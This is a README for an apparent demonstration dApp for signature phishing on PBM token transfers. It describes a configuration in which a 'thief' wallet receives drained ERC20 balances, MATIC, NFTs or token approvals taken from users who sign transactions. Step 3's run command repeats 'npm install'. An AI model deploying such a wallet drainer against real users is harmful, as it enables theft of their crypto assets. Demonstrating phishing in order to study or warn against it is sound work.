#  Signature-phishing PBM transfer demo

## Installation
To use this dApp, you'll need to do the following:

1. Install requisite modules in the `node_modules` folder.
```sh
npm install
```
2. Add your [Alchemy API Key](https://docs.alchemy.com/docs/hello-world-smart-contract#step-2-create-your-app-and-api-key) to `interact.js` line 2.
3.  Run the dApp
```sh
npm install
```
open the dApp in your browswer at http://localhost:3000/.

## Scam configuration
In `interact.js`, 
- set `PBMcontractAddress` to the ERC20 PBM token contract address to be transfered
- set `NFTcontractAddress` to the ERC1155 NFT contract address to be stolen
- set `NFTtokenID` to the ERC1155 NFT tokenID to be stolen
Configure what the dApp will do in `interact.js` by setting `action` and `thief` in lines 22-23. The StealOptions are explanined below:
- honestTransfer: transfers PBM tokens as user intended
- stealPBM: drains users PBM balance to thief wallet
- stealPBMbyApprove: grant thief approval of user's PBM
- stealMatic: steal users MATIC
- stealNFT: steal users NFT
- stealNFTbyApprove: grant thief approval of user's NFTs

### References
https://github.com/alchemyplatform/hello-world-part-four-tutorial